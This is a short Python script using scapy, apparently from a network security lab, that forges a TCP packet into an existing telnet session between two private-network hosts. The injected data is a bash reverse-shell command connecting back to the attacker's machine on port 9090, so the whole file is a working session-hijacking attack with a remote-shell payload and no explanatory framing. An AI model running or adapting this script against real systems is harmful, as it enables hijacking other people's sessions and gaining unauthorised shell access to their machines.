#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")
IPLayer = IP(src="192.168.1.40", dst="192.168.1.66")
TCPLayer = TCP(sport=45966, dport=23, flags="A",
               seq=4262020013, ack=1073092278)
Data = "bash -i >& /dev/tcp/192.168.1.40/9090 0>&1\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)

